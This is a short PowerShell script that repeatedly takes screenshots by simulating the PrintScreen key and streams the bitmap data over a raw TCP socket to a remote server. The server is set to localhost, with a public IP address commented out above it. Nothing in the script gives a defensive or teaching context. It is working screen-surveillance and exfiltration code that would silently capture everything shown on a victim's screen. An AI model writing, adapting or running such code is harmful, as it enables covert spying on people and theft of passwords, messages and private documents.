#$FTPServer = "35.200.251.56"
$FTPServer = "localhost"
$FTPPort = "5000"

$connection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$stream = $connection.GetStream()

$EncodedText = New-Object System.Text.ASCIIEncoding

[void][reflection.assembly]::loadwithpartialname("system.windows.forms")
$counter = 1

while ($connection.Connected) {
	[system.windows.forms.sendkeys]::sendwait('{PRTSC}')
	$image = Get-Clipboard -Format Image
    Write-Host 
    $ms = new-Object IO.MemoryStream
    $image.Save($ms, [System.Drawing.Imaging.ImageFormat]::Bmp);
    $msg = $ms.ToArray();
    
    #print
    Write-Host -NoNewline 'image ' $counter size:  $msg.Length $image.Size

    #send size of image
    $header = $msg.Length
    $hbytes = $EncodedText.GetBytes($header)
    $stream.Write($hbytes,0,$hbytes.Length)
    #end of stream
    $end = $EncodedText.GetBytes('&')

    #send
    $stream.Write($end,0,$end.Length)
    sleep(1)
   # sleep 20

   $send msg
    $stream.Write($msg,0,$msg.Length)
    $stream.Flush()

    $counter = $counter + 1;
	sleep 10
}
